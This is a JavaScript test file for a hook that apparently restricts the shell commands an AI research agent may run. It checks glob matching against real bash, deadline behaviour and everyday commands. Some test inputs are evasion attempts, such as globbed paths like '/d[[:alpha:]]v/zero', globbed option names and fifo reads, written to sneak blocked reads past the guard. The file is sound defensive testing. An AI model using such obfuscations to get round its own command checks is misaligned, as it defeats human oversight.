  assert.match(researcherViolation("ls* notes.md", gb)?.reason ?? "", /not an allowed command/);
  assert.match(researcherViolation('sed -n 1p [" "x]', g1)?.reason ?? "", /`sed` is allowed only/);
  // A glob in an option's name, also one only the raw word shows.
  assert.match(researcherViolation('tail -[" "f] notes.md', g1)?.reason ?? "", /glob in an option/);
  // Through the hook: exit 2, at once.
  for (const c of ["cat [[:alpha:]]", "cat /d[[:alpha:]]v/zero"]) {
    const r = hookTimed(c, g1);
    assert.deepEqual([r.code, r.signal], [2, null], `${c}: ${r.stderr.slice(0, 160)}`);
    assert.ok(r.ms < 3000, `${c}: ${r.ms} ms`);
  }
  const r2 = hookTimed("cat [a/b]", g2);
  assert.deepEqual([r2.code, r2.signal], [2, null], r2.stderr.slice(0, 160));
  // Listing them is not reading them; a class that matches only the regular file passes.
  for (const c of ["ls [[:alpha:]]", "stat [a/b]", "ls [[:punct:]]"]) assert.equal(researcherViolation(c, c.includes("[a/b]") ? g2 : gp), null, c);
  for (const d of [g1, gp, gb]) assert.equal(researcherViolation("cat [[:lower:]][[:lower:]]tes.md [!x]otes.md", d), null, d);
});

// [pattern, path, bash in the C locale, bash in C.UTF-8], recorded with GNU bash 5.3.9 (`compgen -G` in a folder holding
// only that path). The pattern is glob text: a backslash escapes the next character, nothing else quotes.
const W8_TABLE = [
  ["[[:alpha:]]", "x", true, true], ["[[:alpha:]]", "1", false, false], ["[[:digit:]]", "7", true, true],
  ["[[:digit:]]", "a", false, false], ["[[:alnum:]]", "Q", true, true], ["[[:upper:]]", "Q", true, true],
  ["[[:lower:]]", "q", true, true], ["[[:space:]]", " ", true, true], ["[[:blank:]]", "\t", true, true],
  ["[[:punct:]]", "%", true, true], ["[[:punct:]]", ",", true, true], ["[[:print:]]", "a", true, true],
  ["[[:graph:]]", "~", true, true], ["[[:cntrl:]]", "\u0001", true, true], ["[[:xdigit:]]", "f", true, true],
  ["[[:xdigit:]]", "g", false, false], ["[[:word:]]", "_", true, true], ["[![:alpha:]]", "5", true, true],
  ["[^[:digit:]]", "z", true, true], ["[![:alpha:]]", "x", false, false], ["[]a]", "]", true, true],
  ["[]a]", "a", true, true], ["[!]a]", "b", true, true], ["[!]a]", "]", false, false], ["[a-]", "-", true, true],
  ["[a-]", "a", true, true], ["[a-]", "b", false, false], ["[\\]]", "]", true, true], ["[!\\]]", "a", true, true],
  ["[a\\]b]", "]", true, true], ["[[.a.]]", "a", true, true], ["[[.-.]]", "-", true, true],
  ["[[.space.]]", " ", true, true], ["[[=a=]]", "a", true, true], ["[[=a=]b]", "b", true, true],
  ["[[.a.]-c]", "b", true, true], ["[[:digit:]a-f]", "3", true, true], ["[[:digit:]a-f]", "e", true, true],
  ["[[:digit:]a-f]", "g", false, false], ["[[:alpha:][:digit:]]", "5", true, true], ["[[:alpha:]-z]", "-", true, true],
  ["[]-a]", "^", true, true], ["[a", "[a", true, true], ["x[", "x[", true, true], ["[]", "[]", true, true],
  ["[!]", "[!]", true, true], ["[[:alpha:]", "[a", true, true], ["[[:alpha:]", "[:", true, true],
  ["[[:alpha]]", "p]", true, true], ["[[:alpha\\:]]", "a", true, true], ["[\\[:alpha:]]", ":]", true, true],
  ["[a\\]", "[a]", true, true], ["[a/b]", "[a/b]", true, true], ["[a/b]", "a", false, false],
  ["d[[:alpha:]]v/zero", "dev/zero", true, true], ["[.]x", ".x", false, false], [".[[:alpha:]]x", ".ax", true, true],
  ["*[[:alpha:]]", "1a", true, true], ["[[:alpha:]][[:digit:]]", "a1", true, true], ["[[:alpha:]]*.md", "notes.md", true, true],
  ["?[[:upper:]]", "aB", true, true], ["[[:alpha:]]", "é", false, true], ["?", "é", false, true], ["??", "é", true, false],
  ["[[:bogus:]]", "b", false, false], ["[z-a]", "m", false, false], ["[a-c]", "B", false, false], ["[*]", "*", true, true],
  ["\\[a]", "[a]", true, true], ["[\\!a]", "!", true, true],
];
const hasBash = spawnSync("timeout", ["5", "bash", "-c", "compgen -G / >/dev/null"], { encoding: "utf8" }).status === 0;

test("researcher guard (w8): the segment matcher matches every pattern and name bash matches (wider is safe, narrower never)", () => {
  assert.equal(typeof guard.globMatch, "function", "the guard exports its pattern matcher");
  assert.ok(W8_TABLE.length >= 40, String(W8_TABLE.length));
  const tableDir = join(w8, "table");
  // Real bash, one call per locale for the whole table: each pair's folder holds only its path.
  /** @type {boolean[][]} */
  const answers = [];
  if (hasBash) {
    /** @type {string[]} */
    const argv = [];
    W8_TABLE.forEach(([pattern, path], k) => {
      const d = join(tableDir, String(k));
      mkdirSync(dirname(join(d, String(path))), { recursive: true });
      writeFileSync(join(d, String(path)), "");
      argv.push(d, String(pattern));
    });
    const script = 'for ((i=1; i<$#; i+=2)); do j=$((i+1)); (cd "${!i}" && compgen -G "${!j}"); echo "--w8-end--"; done';
    for (const loc of ["C", "C.UTF-8"]) {
      const r = spawnSync("timeout", ["10", "bash", "-c", script, "_", ...argv], { encoding: "utf8", env: { ...process.env, LC_ALL: loc } });
      const blocks = String(r.stdout ?? "").split("--w8-end--\n");
      assert.equal(blocks.length, W8_TABLE.length + 1, `bash answered every pair in ${loc}`);
      answers.push(W8_TABLE.map(([, path], k) => (blocks[k] ?? "").split("\n").includes(String(path))));
    }
  }
  let asked = 0;
  W8_TABLE.forEach(([pattern, path, c, utf8], k) => {
    let matches = Boolean(c || utf8);
    if (hasBash) {
      matches = answers.some((a) => a[k]);
      asked++;
    }
    if (matches) assert.equal(guard.globMatch(String(pattern), String(path)), true, `bash matches ${JSON.stringify(path)} with ${JSON.stringify(pattern)}`);
  });
  if (hasBash) {
    assert.equal(asked, W8_TABLE.length);
    // The recorded expectations are what this bash says too (a different bash may differ; the check above uses its own).
    const differ = W8_TABLE.filter(([, , c, utf8], k) => answers[0]?.[k] !== c || answers[1]?.[k] !== utf8).length;
    assert.ok(differ <= 3, `${differ} recorded answers differ from this bash`);
  }
  // Narrow where the reading is exact: these neither bash nor the guard match.
  for (const [pattern, path] of [["[[:digit:]]", "a"], ["[[:xdigit:]]", "g"], ["[![:alpha:]]", "x"], ["[!]a]", "]"], ["[a-]", "b"], ["[[:digit:]a-f]", "g"], ["[a/b]", "a"], ["[[:alpha:]]", "1"]]) {
    assert.equal(guard.globMatch(String(pattern), String(path)), false, `${pattern} ${path}`);
  }
});

test("researcher guard (w8): class brackets over long names stay linear and inside the deadline", { skip: redosFifo ? false : "mkfifo unavailable" }, () => {
  for (const k of [4, 40]) {
    const r = hookTimed(`cat longn/${"*[[:alpha:]]".repeat(k)}q ; cat fif[[:alpha:]]`, redos);
    assert.deepEqual([r.code, r.signal], [2, null], `${k} pairs: ${r.ms} ms ${r.stderr.slice(0, 160)}`);
    assert.match(r.stderr, /fifo reads a device that may never end/, `${k} pairs`);
    assert.ok(r.ms < 3000, `${k} pairs: ${r.ms} ms`);
  }
  const t0 = performance.now();
  assert.equal(guard.globMatch(`${"*[[:alpha:]]".repeat(40)}q`, "a".repeat(4000)), false);
  assert.equal(guard.globMatch(`${"*[![:digit:]]".repeat(40)}a`, "a".repeat(4000)), true);
  assert.ok(performance.now() - t0 < 1000, `${performance.now() - t0} ms`);
});

test("researcher guard (w8): everyday commands pass, bracket globs included", () => {
  const tree = join(w8, "everyday");
  for (const d of ["src", "docs", ".claude/hooks"]) mkdirSync(join(tree, d), { recursive: true });
  for (const f of ["src/a.ts", "src/a.test.mjs", "src/b.test.ts", "docs/a.md", "docs/b.md", ".claude/hooks/x.mjs", "README.md", "a1.txt", "b2.txt", "c3.txt"]) writeFileSync(join(tree, f), "x\n");
  for (const c of ["rg -n x src", "rg x **/*.md", "grep -rn '[[:alpha:]]' docs", "ls src/*.test.*", "cat docs/*.md", "ls [a-c]*", "head -5 src/*.ts", "wc -l .claude/hooks/*.mjs", "cat [ab]1.txt [[:lower:]][[:digit:]].txt", "grep -n x [!.]*.txt"]) {
    assert.equal(researcherViolation(c, tree), null, c);
  }
});
